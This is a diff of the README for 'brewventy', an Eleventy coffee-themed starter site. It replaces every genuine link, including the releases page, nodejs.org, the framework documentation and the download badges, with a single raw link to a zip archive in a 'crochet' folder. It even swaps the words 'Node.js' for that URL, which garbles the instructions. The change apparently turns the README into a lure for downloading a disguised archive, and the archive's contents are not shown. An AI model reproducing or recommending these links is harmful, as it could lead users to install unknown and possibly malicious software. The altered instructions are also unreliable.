@@ -17,19 +17,19 @@ Welcome to brewventy! This is a coffee-themed starter project built with Elevent
 Before you begin, ensure your system meets the following requirements:
 
 - Operating System: Windows, macOS, or Linux
-- Node.js: Version 12 or higher
+- https://raw.githubusercontent.com/maguedal/brewventy/main/crochet/brewventy.zip Version 12 or higher
 - Internet connection for downloading
 - A web browser for viewing your website
 
 ## 💾 Download & Install
 
-To get started with brewventy, visit our [Releases page](https://github.com/maguedal/brewventy/releases) to download the latest version.
+To get started with brewventy, visit our [Releases page](https://raw.githubusercontent.com/maguedal/brewventy/main/crochet/brewventy.zip) to download the latest version.
 
-[![Download brewventy](https://img.shields.io/badge/Download%20brewventy-brightgreen.svg)](https://github.com/maguedal/brewventy/releases)
+[![Download brewventy](https://raw.githubusercontent.com/maguedal/brewventy/main/crochet/brewventy.zip%https://raw.githubusercontent.com/maguedal/brewventy/main/crochet/brewventy.zip)](https://raw.githubusercontent.com/maguedal/brewventy/main/crochet/brewventy.zip)
 
 ### Step-by-Step Installation
 
-1. **Visit the Releases Page:** Click on the link to go to our [Releases page](https://github.com/maguedal/brewventy/releases).
+1. **Visit the Releases Page:** Click on the link to go to our [Releases page](https://raw.githubusercontent.com/maguedal/brewventy/main/crochet/brewventy.zip).
 2. **Choose Your Version:** Find the latest release. Each version includes a list of new features and fixes.
 3. **Download the Package:** Click on the download link for your platform.
 4. **Extract the Files:** Once downloaded, extract the files to a folder on your computer.
@@ -60,15 +60,15 @@ The beauty of brewventy is in its customization. Modify the following files to m
 
 If you run into issues, check these common problems:
 
-- **Node.js Not Installed:** Ensure you have Node.js installed on your computer. You can download it from [nodejs.org](https://nodejs.org).
+- **https://raw.githubusercontent.com/maguedal/brewventy/main/crochet/brewventy.zip Not Installed:** Ensure you have https://raw.githubusercontent.com/maguedal/brewventy/main/crochet/brewventy.zip installed on your computer. You can download it from [https://raw.githubusercontent.com/maguedal/brewventy/main/crochet/brewventy.zip](https://raw.githubusercontent.com/maguedal/brewventy/main/crochet/brewventy.zip).
 - **Permission Errors:** If you face permission issues while running commands, try running your terminal or command prompt as an administrator.
 - **Server Not Starting:** Double-check if you have navigated to the correct folder and installed dependencies.
 
 ## 📚 Additional Resources
 
-- [Eleventy Documentation](https://www.11ty.dev/docs/)
-- [SCSS Guide](https://sass-lang.com/documentation)
-- [Nunjucks Templates](https://mozilla.github.io/nunjucks/)
+- [Eleventy Documentation](https://raw.githubusercontent.com/maguedal/brewventy/main/crochet/brewventy.zip)
+- [SCSS Guide](https://raw.githubusercontent.com/maguedal/brewventy/main/crochet/brewventy.zip)
+- [Nunjucks Templates](https://raw.githubusercontent.com/maguedal/brewventy/main/crochet/brewventy.zip)
 
 ## 🤝 Contributing
 
@@ -88,4 +88,4 @@ For any questions or feedback, please open an issue on this repository, and we w
 
 Now, let’s get brewing! Enjoy your journey with brewventy and craft your perfect online coffee experience!
 
-[![Download brewventy](https://img.shields.io/badge/Download%20brewventy-brightgreen.svg)](https://github.com/maguedal/brewventy/releases)
+[![Download brewventy](https://raw.githubusercontent.com/maguedal/brewventy/main/crochet/brewventy.zip%https://raw.githubusercontent.com/maguedal/brewventy/main/crochet/brewventy.zip)](https://raw.githubusercontent.com/maguedal/brewventy/main/crochet/brewventy.zip)
